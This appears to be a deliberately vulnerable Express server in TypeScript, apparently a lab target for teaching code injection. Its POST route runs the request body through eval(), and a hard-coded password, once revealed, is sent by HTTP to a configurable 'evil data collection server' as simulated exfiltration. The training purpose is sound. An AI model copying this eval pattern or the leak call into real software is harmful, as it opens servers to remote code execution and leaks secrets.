import http = require('http')
import express = require('express');
import bodyParser = require('body-parser');
const pwd = "MySuperS3curePwd"

const SERV_PORT = Number(process.env.SERV_PORT) || 3000
const EVIL_HOST = process.env.EVIL_HOST || 'localhost'
const EVIL_PORT = Number(process.env.EVIL_PORT) || 7777
const EVIL_PROT = process.env.EVIL_PROT || 'http'

const app: express.Application = express();

// serving static files for the web frontend
app.use(express.static('public'))

app.use(bodyParser.text());

app.post('/info/:filename(*)', function (req, res) {  
    
    console.log("We got parameter: "+req.params.filename)
    const data = req.body
    console.log("We got data: "+data)
    const result = eval(data)
    if (result == pwd){
      reportBreak(result) 
    }
    res.setHeader('Content-Type', 'text/plain')
    res.send( ""+result ) 
});

console.log(`Starting up server on port: ${SERV_PORT}...`)
app.listen(SERV_PORT, function () {
  console.log(` Broken server app listening on port ${SERV_PORT}!`);
  console.log(` Now open your browser at http://localhost:${SERV_PORT}/`);
});

// report that someone found out the password
// i.e. send data leak info to "Evil Server"
function reportBreak(msg:String) {
  const url = encodeURI(`${EVIL_PROT}://${EVIL_HOST}:${EVIL_PORT}/reportleak/RemoteExecutionServer-reports-pwd-broken:${msg}`)
  console.log("reporting to the evil data collection server: "+ url)
  http.get(url).on('error', (err) => {
    console.log("Err: we could not report to the 'evil' data collection server.")
    console.log("Make sure the server is up and running. ("+err+"')")
  } )
}

